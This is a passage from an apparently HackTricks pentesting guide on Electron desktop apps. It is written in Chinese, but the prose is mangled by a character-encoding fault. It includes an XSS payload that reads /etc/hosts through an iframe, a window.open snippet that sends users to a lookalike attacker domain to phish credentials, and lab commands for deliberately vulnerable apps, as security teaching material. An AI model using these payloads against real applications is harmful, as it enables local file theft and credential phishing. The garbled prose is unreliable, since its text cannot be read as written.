ä»è¿™ä¸ª[**writeup**](https://bugcrowd.com/disclosures/f7ce8504-0152-483b-bbf3-fb9b759f9f89/critical-local-file-read-in-electron-desktop-app)ä¸­ï¼Œè¿˜æœ‰å¦ä¸€ç§**è¯»å–å†…éƒ¨æ–‡ä»¶**çš„æ–¹æ³•ï¼š
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + æ—§ç‰ˆ Chromium**

å¦‚æœåº”ç”¨ç¨‹åºä½¿ç”¨çš„ **Chromium** ç‰ˆæœ¬è¾ƒæ—§ï¼Œå¹¶ä¸”å­˜åœ¨å·²çŸ¥çš„æ¼æ´ï¼Œå¯èƒ½å¯ä»¥é€šè¿‡ XSS åˆ©ç”¨å®ƒå¹¶è·å– RCEã€‚\
æ‚¨å¯ä»¥åœ¨æ­¤ **writeup** ä¸­çœ‹åˆ°ä¸€ä¸ªç¤ºä¾‹ï¼š[https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **é€šè¿‡å†…éƒ¨ URL æ­£åˆ™ç»•è¿‡è¿›è¡Œ XSS é’“é±¼**

å‡è®¾æ‚¨å‘ç°äº†ä¸€ä¸ª XSS æ¼æ´ï¼Œä½†æ˜¯æ— æ³•è§¦å‘ RCE æˆ–çªƒå–å†…éƒ¨æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨å®ƒæ¥é€šè¿‡é’“é±¼çªƒå–å‡­æ®ã€‚

é¦–å…ˆï¼Œæ‚¨éœ€è¦äº†è§£åœ¨å°è¯•æ‰“å¼€æ–° URL æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Œæ£€æŸ¥å‰ç«¯çš„ JS ä»£ç ï¼š
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
è°ƒç”¨**`openInternally`**å‡½æ•°å°†å†³å®šé“¾æ¥æ˜¯åœ¨æ¡Œé¢çª—å£ä¸­æ‰“å¼€ï¼ˆå› ä¸ºå®ƒæ˜¯å±äºå¹³å°çš„é“¾æ¥ï¼‰ï¼Œè¿˜æ˜¯åœ¨æµè§ˆå™¨ä¸­ä½œä¸ºç¬¬ä¸‰æ–¹èµ„æºæ‰“å¼€ã€‚

å¦‚æœå‡½æ•°ä½¿ç”¨çš„**æ­£åˆ™è¡¨è¾¾å¼å®¹æ˜“è¢«ç»•è¿‡**ï¼ˆä¾‹å¦‚ï¼Œæ²¡æœ‰è½¬ä¹‰å­åŸŸåä¸­çš„ç‚¹ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨XSSæ¼æ´**æ‰“å¼€ä¸€ä¸ªæ–°çª—å£**ï¼Œè¯¥çª—å£ä½äºæ”»å‡»è€…çš„åŸºç¡€è®¾æ–½ä¸­ï¼Œå¹¶å‘ç”¨æˆ·**ç´¢å–å‡­æ®**ï¼š
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **å·¥å…·**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) æ˜¯ä¸€ä¸ªç”¨äºè¯†åˆ«åŸºäº Electron çš„åº”ç”¨ç¨‹åºä¸­çš„é…ç½®é”™è¯¯å’Œå®‰å…¨åæ¨¡å¼çš„å·¥å…·ã€‚
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) æ˜¯ä¸€ä¸ªç”¨äº Electron åº”ç”¨ç¨‹åºçš„å¼€æº VS Code æ’ä»¶ï¼Œä½¿ç”¨äº† Electronegativityã€‚
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) ç”¨äºæ£€æŸ¥å­˜åœ¨æ¼æ´çš„ç¬¬ä¸‰æ–¹åº“ã€‚
* [**Electro.ng**](https://electro.ng/)ï¼šéœ€è¦è´­ä¹°ã€‚

## å®éªŒ

åœ¨ [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå®éªŒæ¥åˆ©ç”¨å­˜åœ¨æ¼æ´çš„ Electron åº”ç”¨ç¨‹åºã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›æœ‰åŠ©äºå®Œæˆå®éªŒçš„å‘½ä»¤ï¼š
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **å‚è€ƒèµ„æ–™**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* æœ‰å…³ Electron å®‰å…¨æ€§çš„æ›´å¤šç ”ç©¶å’Œå†™ä½œï¼Œè¯·å‚è€ƒ [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­ **ä¸ºä½ çš„å…¬å¸åšå¹¿å‘Š** å—ï¼Ÿæˆ–è€…æƒ³è¦è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
